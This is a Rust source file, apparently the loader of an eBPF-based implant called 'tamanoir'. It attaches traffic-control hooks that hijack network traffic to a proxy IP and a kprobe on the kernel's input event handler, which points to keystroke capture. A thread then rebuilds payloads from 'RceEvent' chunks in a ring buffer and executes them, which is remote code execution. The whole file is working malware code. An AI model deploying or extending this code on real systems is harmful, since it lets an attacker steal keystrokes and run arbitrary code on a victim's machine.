use core::str;
use std::{net::Ipv4Addr, os::fd::AsRawFd, thread, time::Duration};

use aya::{
    programs::{tc, KProbe, SchedClassifier, TcAttachType},
    EbpfLoader,
};
use clap::Parser;
use log::{debug, warn};
use mio::{unix::SourceFd, Events, Interest, Poll, Token};
use tamanoir::{rce::execute, ringbuf::RingBuffer};
use tamanoir_common::{ContinuationByte, RceEvent};
use tokio::signal;

#[derive(Debug, Parser)]
struct Opt {
    #[clap(short, long, default_value = "wlan0")]
    iface: String,

    #[clap(long, required = true)]
    proxy_ip: Ipv4Addr,

    #[clap(long, required = true)]
    hijack_ip: Ipv4Addr,

    #[clap(long, default_value_t = 0)]
    layout: u8,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    env_logger::init();

    let Opt {
        iface,
        proxy_ip,
        hijack_ip,
        layout,
    } = Opt::parse();

    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        debug!("remove limit on locked memory failed, ret is: {}", ret);
    }

    let proxy_ip = proxy_ip.to_bits();
    let hijack_ip = hijack_ip.to_bits();

    let mut ebpf = EbpfLoader::new()
        .set_global("TARGET_IP", &proxy_ip, true)
        .set_global("HIJACK_IP", &hijack_ip, true)
        .set_global("KEYBOARD_LAYOUT", &layout, true)
        .load(aya::include_bytes_aligned!(
            "../../target/bpfel-unknown-none/release/tamanoir"
        ))?;

    if let Err(e) = aya_log::EbpfLogger::init(&mut ebpf) {
        warn!("failed to initialize eBPF logger: {}", e);
    }

    let _ = tc::qdisc_add_clsact(&iface);

    let tc_program_egress: &mut SchedClassifier =
        ebpf.program_mut("tamanoir_egress").unwrap().try_into()?;

    tc_program_egress.load()?;
    tc_program_egress.attach(&iface, TcAttachType::Egress)?;

    let tc_program_ingress: &mut SchedClassifier =
        ebpf.program_mut("tamanoir_ingress").unwrap().try_into()?;

    tc_program_ingress.load().unwrap();
    tc_program_ingress.attach(&iface, TcAttachType::Ingress)?;

    let program: &mut KProbe = ebpf.program_mut("tamanoir_kprobe").unwrap().try_into()?;
    program.load()?;
    program.attach("input_handle_event", 0)?;

    thread::spawn({
        move || {
            let mut poll = Poll::new().unwrap();
            let mut events = Events::with_capacity(128);
            let mut ring_buf = RingBuffer::new(&mut ebpf);
            let mut payload: Vec<u8> = vec![];

            poll.registry()
                .register(
                    &mut SourceFd(&ring_buf.buffer.as_raw_fd()),
                    Token(0),
                    Interest::READABLE,
                )
                .unwrap();
            loop {
                poll.poll(&mut events, Some(Duration::from_millis(100)))
                    .unwrap();

                for event in &events {
                    if event.token() == Token(0) && event.is_readable() {
                        while let Some(item) = ring_buf._next() {
                            let rce: [u8; RceEvent::LEN] = item.to_owned().try_into().unwrap();
                            let rce = rce.as_ptr() as *const RceEvent;
                            let rce = unsafe { *rce };
                            if rce.is_first_batch {
                                debug!("payload batch transmission start");
                                if let ContinuationByte::Reset | ContinuationByte::ResetEnd =
                                    rce.event_type
                                {
                                    debug!("clear payload");
                                    payload.clear()
                                }
                            }

                            payload.extend_from_slice(rce.payload());
                            debug!("transmitted payload is now {} bytes long ", payload.len());
                            if rce.is_last_batch {
                                debug!("payload batch transmission is finished!");
                                if let ContinuationByte::End | ContinuationByte::ResetEnd =
                                    rce.event_type
                                {
                                    debug!("payload full transmission is finished, sending it to executor");
                                    let _ = execute(&payload);
                                }
                            }
                        }
                    }
                }
            }
        }
    });
    let ctrl_c = signal::ctrl_c();
    println!("Waiting for Ctrl-C...");
    ctrl_c.await?;
    println!("Exiting...");

    Ok(())
}
